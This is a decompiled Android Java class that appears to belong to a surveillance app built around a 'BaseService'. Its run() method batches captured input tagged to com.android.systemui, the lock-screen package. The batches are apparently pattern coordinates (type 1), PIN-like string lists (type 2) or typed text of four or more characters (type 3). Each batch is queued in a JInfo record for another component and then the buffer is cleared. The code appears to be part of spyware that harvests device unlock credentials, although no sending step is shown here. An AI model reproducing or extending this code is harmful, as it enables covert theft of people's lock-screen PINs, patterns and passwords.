package e3;

import com.superbock.auto.BaseService;
import com.superbock.bean.JInfo;
import f3.n;
import g3.k;
import java.util.Iterator;
import k3.f;

/* loaded from: classes2.dex */
public final class e implements Runnable {
    /* JADX WARN: Type inference failed for: r0v1, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r0v10, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v12, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v15, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v16, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r0v18, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r0v21, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r5v1, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r5v3, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r5v7, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    @Override // java.lang.Runnable
    public final void run() {
        if (BaseService.T == 0) {
            return;
        }
        if (BaseService.O.isEmpty()) {
            if (BaseService.P.isEmpty()) {
                if ("".equals(BaseService.S) || BaseService.S.length() < 4) {
                    return;
                }
                k.b().a(new JInfo(d.a(), BaseService.T, "com.android.systemui", 3, BaseService.S, (String) f.f3881l.get("com.android.systemui")));
                BaseService.S = "";
            } else {
                if (BaseService.P.size() < 4) {
                    return;
                }
                Iterator it = BaseService.P.iterator();
                String str = "";
                while (it.hasNext()) {
                    String str2 = (String) it.next();
                    if (!"".equals(str)) {
                        str = androidx.activity.d.f(str, ";");
                    }
                    str = androidx.activity.d.f(str, str2);
                }
                k.b().a(new JInfo(d.a(), BaseService.T, "com.android.systemui", 2, str, BaseService.Q, (String) f.f3881l.get("com.android.systemui")));
                BaseService.P.clear();
                BaseService.Q = "";
            }
        } else {
            if (BaseService.O.size() < 4) {
                return;
            }
            Iterator it2 = BaseService.O.iterator();
            String str3 = "";
            String str4 = str3;
            while (it2.hasNext()) {
                n nVar = (n) it2.next();
                if (!"".equals(str3)) {
                    str3 = androidx.activity.d.f(str3, ";");
                }
                StringBuilder g5 = androidx.activity.d.g(str3);
                g5.append(nVar.f2834b);
                str3 = g5.toString();
                StringBuilder g6 = androidx.activity.d.g(str4);
                g6.append(nVar.f2833a);
                str4 = g6.toString();
            }
            k.b().a(new JInfo(d.a(), BaseService.T, "com.android.systemui", 1, str3, str4, (String) f.f3881l.get("com.android.systemui")));
            BaseService.O.clear();
        }
        BaseService.T = 0L;
    }
}
